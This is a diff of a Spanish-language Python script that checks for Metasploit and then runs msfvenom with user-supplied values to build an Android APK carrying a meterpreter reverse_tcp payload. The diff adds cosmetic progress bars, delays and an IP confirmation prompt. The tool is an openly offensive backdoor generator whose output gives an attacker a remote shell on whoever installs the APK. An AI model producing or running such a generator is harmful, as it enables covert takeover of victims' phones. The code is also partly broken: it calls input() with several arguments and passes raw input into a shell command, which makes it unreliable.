@@ -1,7 +1,9 @@
 #Programa Creado Por NesAnTime
+from tqdm import tqdm
 import os
 import subprocess
 import platform
+import time
 
 def Limpiar():
     sistema = platform.system()
@@ -12,6 +14,15 @@ def Limpiar():
     else:
         print("Este Sistema No Posee Mas Soporte")
 
+def lapzo():
+    tiempo = 3
+    time.sleep(tiempo)
+
+def Barra(desc):
+    lista_de_elementos = range(100)
+    for elemento in tqdm(lista_de_elementos, desc):
+        time.sleep(0.1)
+    
 
 def check_metasploit():
     try:
@@ -31,14 +42,18 @@ def instalar_metasploit():
         print(f"Error al instalar Metasploit: {e}")
         return False
     
+
+
 def Dependencias():
     print("Comprobando dependencias Instaladas")
+    lapzo()
     print("Verificando La Herramienta Metasploit")
     print("Verificando la Dependencia MSFVenom")
+    lapzo()
     check_metasploit()
     if check_metasploit():
         print("msfvenom - Metasploit está instalado en el sistema.")
-        input("Presione Enter Para Continuar.. ")
+        input("\nPresione Enter Para Continuar.. ")
         executeandroid()
     else:
         print("msfvenom - Metasploit no está instalado en el sistema.")
@@ -51,8 +66,8 @@ def Dependencias():
             print("Iniciando Descarga De Dependencias...")
             instalar_metasploit()
             if instalar_metasploit():
-                print("Verificando La Instalacion..")
-                print("Ahora puedes utilizar Metasploit.")
+                Barra(desc="Verificando La Instalacion:")
+                print("\nAhora puedes utilizar Metasploit.")
                 print("Se Puede Proceder Con La Ejecucion del Playload")
                 input("Presione Enter Para Continuar... ")
                 executeandroid()
@@ -62,22 +77,29 @@ def Dependencias():
 
 def executeandroid():
     Limpiar()
-    print("Ejecucucion del Payload Completada...")
+    Barra(desc="Iniciando la Ejecucion: ")
+    print("\nEjecucion del Payload Completada...")
     print("A Continuacion, Se Completara La Creacion De La Apk\n")
-    ip = float(input("Proporcione Su Direccion IP: \n"))
+    ip = input("Proporcione Su Direccion IP: \n")
+    lop = input("Su direccion IP:",ip," ¿Es Correcta? (y/n): ")
+    while lop == "n":
+        ip = input("Proporcione Su Direccion IP Nuevamente: \n")
+        lop = input("Su direccion IP:",ip," ¿Es Correcta? (y/n): ")
+    Limpiar()
     print(f"Direccion IP ({ip}) Establecida Correctamente...\n")
 
     port = int(input("Proporcione un Puerto de Escucha: "))
-    print(f"El Puerto de Escucha ({port}) Se ha Establecido Correctamente..\n")
+    print(f"El Puerto de Escucha (" + str(port) + ") Se ha Establecido Correctamente..\n")
     Limpiar()
 
-    print("Terminando La Creacion del APK")
+    print("** Terminando La Creacion del APK ** ")
     name = input("Ingrese el Nombre del Archivo .Apk: ")
     print(f"Se Ha establecido El Nombre del Archivo ({name}.apk) Correctamente! ")
-    
     Limpiar()
+    Barra(desc="Creando Archivo .Apk")
+
     try:
-        comando = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ ip + " LPORT="+ port + " -o " + name +".apk"
+        comando = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ ip + " LPORT="+ str(port) + " -o " + name +".apk"
         resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
         print("Se Ha Creado El Archivo .APK Correctamente\n")
         print("*** Informacion Y Detalles ***")
@@ -85,6 +107,7 @@ def executeandroid():
         print(f"IP: {ip}")
         print(f"PORT: {port}")
         input("\nPresione Enter Para Finalizar... ")
+        Main()
 
         return True
     except subprocess.CalledProcessError as e:
